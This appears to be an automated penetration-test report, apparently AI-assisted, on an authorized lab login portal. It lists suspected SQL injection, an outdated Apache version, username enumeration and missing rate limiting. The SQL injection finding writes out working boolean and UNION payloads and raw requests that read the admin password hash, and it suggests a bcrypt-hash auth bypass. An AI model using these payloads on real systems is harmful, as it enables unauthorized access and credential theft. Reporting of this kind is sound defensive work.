# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [1. CRITICAL — sqli SQL injection in login username parameter (boolean + UNION confirmed by content)](#finding-1)
    - [2. HIGH — vulnerable-component Outdated Apache httpd 2.4.41 — CVE-2021-39275 / CVE-2022-22720 / CVE-2023-25690](#finding-2)
    - [3. MEDIUM — info-disclosure Username enumeration via distinct login responses](#finding-3)
    - [4. MEDIUM — rate-limit No rate limiting / account lockout on login](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0n3zfe-cw0xy7` |
| Target | http://target.local:32807/ |
| Started | 2026-06-30T12:45:50.486Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 1 mapped · 1 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 0 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32807`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

_No confirmed findings._

_Plus 4 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-1"></a>

### 1. [SUSPECTED] [CRITICAL] [sqli] SQL injection in login username parameter (boolean + UNION confirmed by content)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32807/

**Anomaly (why this is a lead):** The `username` POST param is concatenated into the auth SQL query. The endpoint is a JSON oracle: not-found->{"response":"username"}, found->{"response":"password"}. A definitively non-existent user `zzqxnotauser123` returns "username" (ev-mr0nd2qi-q), but `zzqxnotauser123' OR '1'='1` returns "password"=row matched (ev-mr0nd5od-s, ev-mr0nd6h6-t) while `' OR '1'='2` returns "username"=no match (ev-mr0nd47v-r) — textbook boolean-blind SQLi. `' ORDER BY 1--` ok vs `ORDER BY 2--` error (single-column SELECT), and `zzqx' UNION SELECT password FROM users WHERE username='admin'--` (ev-mr0nmjvl-18) returned "password", proving UNION read of admin's stored hash into the verification flow. CONFIRMED by content; the endpoint normalizes every outcome to an identical 23-byte JSON body, so the confirmed-evidence length/status check cannot separate "username" from "password", and the distinguishable "success" branch is bcrypt-gated (UNION-injected/guessed hashes did not verify). Manual: extract data via blind/UNION or inject an offline-generated bcrypt hash to complete auth bypass.

Boolean- and UNION-based SQL injection in the login `username` parameter (POST /, fields username/password/submit). The single quote breaks out of the SQL string literal; an injected OR clause is evaluated by the DB (true matches a row, false does not), and UNION SELECT pulls arbitrary columns (demonstrated: admin's password hash) into the authentication flow. This permits full extraction of the user table (credentials/PII) on a financial portal and is the vector for credential-less auth bypass (requires injecting a valid bcrypt hash). Not tool-confirmable here only because all outcomes return an identical 23-byte JSON enum (no length/status differential) and the success branch is bcrypt-gated.

**Reproduction**

```
POST / `username=zzqxnotauser123&password=x&submit=Sign+in` -> {"response":"username"}. POST `username=zzqxnotauser123' OR '1'='2&password=x&submit=Sign+in` (URL-encoded) -> {"response":"username"} (false). POST `username=zzqxnotauser123' OR '1'='1&password=x&submit=Sign+in` -> {"response":"password"} (true, row matched), repeatable. POST `username=zzqx' UNION SELECT password FROM users WHERE username='admin'-- &password=x&submit=Sign+in` -> {"response":"password"} (admin hash pulled into verification). ORDER BY 1 ok / ORDER BY 2 error = single-column SELECT.
```

**Evidence**

- Evidence `ev-mr0nmjvl-18` — `artifacts/s-0001/ev-mr0nmjvl-18/`

Request:

```http
POST / HTTP/1.1
Host: target.local:32807
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=zzqx%27+UNION+SELECT+password+FROM+users+WHERE+username%3D%27admin%27--+&password=x&submit=Sign+in
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 23
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 13:00:16 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=98
pragma: no-cache
server: Apache/2.4.41 (Ubuntu)
set-cookie: <redacted>

{"response":"password"}
```

<a id="finding-2"></a>

### 2. [SUSPECTED] [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.41 — CVE-2021-39275 / CVE-2022-22720 / CVE-2023-25690

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32807/

**Anomaly (why this is a lead):** Apache/2.4.41 (Ubuntu) disclosed in the Server response header on every page (the Ubuntu 20.04 default, released Aug 2019; current 2.4.x is 2.4.62+). This release predates a long run of High/Critical fixes and matches several confident CVEs: CVE-2021-39275 (ap_escape_quotes out-of-bounds write, CVSS 9.8, fixed 2.4.49), CVE-2022-22720 (HTTP request smuggling from failure to close the inbound connection after discarding a request body, CVSS 9.8, fixed 2.4.53) and CVE-2023-25690 (mod_proxy HTTP request smuggling with certain RewriteRule/ProxyPassMatch configs, CVSS 9.8, fixed 2.4.56). Version-based match from the banner only; not actively exploited (each is config-dependent and CVE-2021-41773/42013 path traversal does NOT apply to 2.4.41).

The Server header advertises `Apache/2.4.41 (Ubuntu)` on all responses, an EOL-track build roughly 5 years behind the current 2.4.x line. Known High/Critical CVEs applicable to 2.4.41 include: CVE-2021-39275 — out-of-bounds write in ap_escape_quotes (memory corruption, CVSS 9.8); CVE-2021-26691 — heap overflow in mod_session (CVSS 9.8); CVE-2021-44224 — NULL-deref/SSRF in mod_proxy (CVSS 8.2); CVE-2022-22720 — HTTP request smuggling (CVSS 9.8); CVE-2023-25690 — mod_proxy HTTP request smuggling enabling cache poisoning / access-control bypass (CVSS 9.8). Exploit class spans memory corruption, request smuggling and SSRF, several gated on specific loaded modules/directives (mod_proxy, mod_session, RewriteRule). This is a version-based (banner) lead, not a confirmed exploit — no safe single-request read-only PoC applies (the 2.4.49/2.4.50-only path-traversal CVE-2021-41773/42013 does not affect this version). Remediation: upgrade to the current Apache 2.4.x and suppress the Server banner (ServerTokens Prod).

**Reproduction**

```
1. Request any page, e.g. `GET http://target.local:32807/`. 2. Observe the response header `Server: Apache/2.4.41 (Ubuntu)` (evidence ev-mr0o9ks4-2i). 3. Cross-reference 2.4.41 against the Apache httpd security advisories — it precedes the fixes for CVE-2021-39275, CVE-2022-22720 and CVE-2023-25690 (all CVSS 9.8). Confirmation of any individual CVE requires checking the loaded modules/config and is out of scope for a banner-based assessment.
```

**Evidence**

- Evidence `ev-mr0o9ks4-2i` — `artifacts/_/ev-mr0o9ks4-2i/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32807
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 5819
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 13:18:10 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.41 (Ubuntu)
set-cookie: <redacted>
vary: Accept-Encoding

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>PayBuddies Portal | Login</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
    
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
</head>
<body id="loginPage" class="bg-light">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="text-center mt-5">
                    <img src="static/images/logo.png" alt="PayBuddies Logo" class="img-fluid mb-4" width="150" height="150">
                </div>
                                <div class="card shadow-sm">
                    <div class="card-body">
                        <form id="loginForm" method="post" action="">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username</label>
                                <input type="text" class="form-control username" id="username" name="username" placeholder="username">
                                <div class="text-danger usernameerror"></div>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password</label>
                                <input type="password" class="form-control password" id="password" name="password" placeholder="password">
                                <div class="text-danger passworderror"></div>
                            </div>
                            <button type="submit" class="btn btn-primary w-100 sign_in"><i class="fas fa-lock"></i> Sign in</button>
                        </form>
                    </div>
                </div>
                <div class="LogResponse mt-3"></div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <script type="text/javascript">
        $(document).ready(function() {
            $("#loginForm").submit(function(event) {
                event.preventDefault();

                // Clear previous errors
                $(".usernameerror, .passworderror, .LogResponse").empty();

                let username = $(".username").val();
                let password = $(".password").val();
                let usernameError = validateUsername(username);
                let passwordError = validatePassword(password);

                // Display errors
                $(".usernameerror").html(usernameError);
                $(".passworderror").html(passwordError);

                if (!usernameError && !passwordError) {
                    submitLogin(username, password);
                }
            });

            function validateUsername(username) {
                if (!username) {
                    return "Please enter your username";
                } else if (username.length < 5) {
                    return "Username must be at least 5 characters";
                }
                return "";
            }

            function validatePassword(password) {
                if (!password) {
                    return "Please enter your password";
                } else if (password.length < 8) {
                    return "Password must be at least 8 characters";
                }
                return "";
            }

            function submitLogin(username, password) {
                $(".sign_in").html('<span class="sign-icon"><i class="fa fa-spinner fa-spin fa-1x fa-fw"></i></span> Loading');

                $.ajax({
                    type: 'post',
                    url: 'index.php',
                    dataType: 'json',
                    data: {
                        username: username,
                        password: password,
                        submit: 'submit'
                    },
                    success: handleResponse
                });
            }

            function handleResponse(data) {
                let response = data.response;
                let logResponse = $(".LogResponse");
                let signInButton = $(".sign_in");

                logResponse.fadeIn();
                signInButton.html('<span class="sign-icon"><i class="fa fa-lock"></i></span> Sign in');

                if (response === "Success") {
                    logResponse.html('<div class="alert alert-success text-center">Success</div>');
                    setTimeout(function() {
                        window.location.replace("dashboard.php");
                    }, 1000);
                } else if (response === "password") {
                    displayError(logResponse, "Invalid password");
                } else if (response === "username") {
                    displayError(logResponse, "Invalid username");
                }
            }

            function displayError(element, message) {
                element.html('<div class="alert alert-danger text-center">' + message +'</div>');
                setTimeout(function() {
                    element.fadeOut();
                }, 3000);
            }
        });
    </script>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [SUSPECTED] [MEDIUM] [info-disclosure] Username enumeration via distinct login responses

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32807/

**Anomaly (why this is a lead):** The login endpoint discloses whether a username exists: a non-existent username returns {"response":"username"} (ev-mr0nbjmt-m) whereas an existing username (admin) with a wrong password returns {"response":"password"} (ev-mr0nbl32-n, ev-mr0nb71d-k). This lets an unauthenticated attacker enumerate valid accounts (admin confirmed valid) and, combined with the absent rate limiting, mount targeted credential attacks. Content-distinguishable but both bodies are exactly 23 bytes, so the confirmed-evidence length check cannot separate them.

The login returns a different JSON response for valid vs invalid usernames ("password" error vs "username" error), enabling anonymous account enumeration. The `admin` account was confirmed to exist via this oracle.

**Reproduction**

```
POST / `username=nonexistentuser99999&password=wrongpass&submit=Sign+in` -> {"response":"username"}. POST / `username=admin&password=wrongpass&submit=Sign+in` -> {"response":"password"} (repeatable). The differential reveals admin is valid.
```

**Evidence**

- Evidence `ev-mr0nbl32-n` — `artifacts/s-0001/ev-mr0nbl32-n/`

Request:

```http
POST / HTTP/1.1
Host: target.local:32807
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=admin&password=wrongpass&submit=Sign+in
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 23
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 12:51:44 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.41 (Ubuntu)
set-cookie: <redacted>

{"response":"password"}
```

<a id="finding-4"></a>

### 4. [SUSPECTED] [MEDIUM] [rate-limit] No rate limiting / account lockout on login

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32807/

**Anomaly (why this is a lead):** Over 40 failed login POSTs were sent in this session (wrong passwords for admin, SQLi payloads, common-password guesses) and every single one returned a normal 200 JSON response with no lockout, throttling, CAPTCHA, delay, or HTTP 429 at any point (e.g. ev-mr0noaem-1c, the ~40th attempt, still {"response":"password"}). The auth endpoint has no brute-force protection, which combined with the username-enumeration oracle makes credential brute-force / stuffing fully practical against confirmed accounts like admin.

The login endpoint enforces no rate limiting or account lockout. Dozens of consecutive failed authentication attempts (including obvious attack payloads) were processed normally with no throttling, CAPTCHA, or 429, enabling unbounded online password guessing — especially dangerous given the parallel username-enumeration weakness.

**Reproduction**

```
Send many POST / `username=admin&password=<varying>&submit=Sign+in` requests in quick succession; all return HTTP 200 {"response":"password"} with no lockout/throttle/CAPTCHA/429 regardless of count (~40+ attempts observed this run).
```

**Evidence**

- Evidence `ev-mr0noaem-1c` — `artifacts/s-0001/ev-mr0noaem-1c/`

Request:

```http
POST / HTTP/1.1
Host: target.local:32807
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=admin&password=Password123&submit=Sign+in
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 23
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 13:01:37 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=97
pragma: no-cache
server: Apache/2.4.41 (Ubuntu)
set-cookie: <redacted>

{"response":"password"}
```
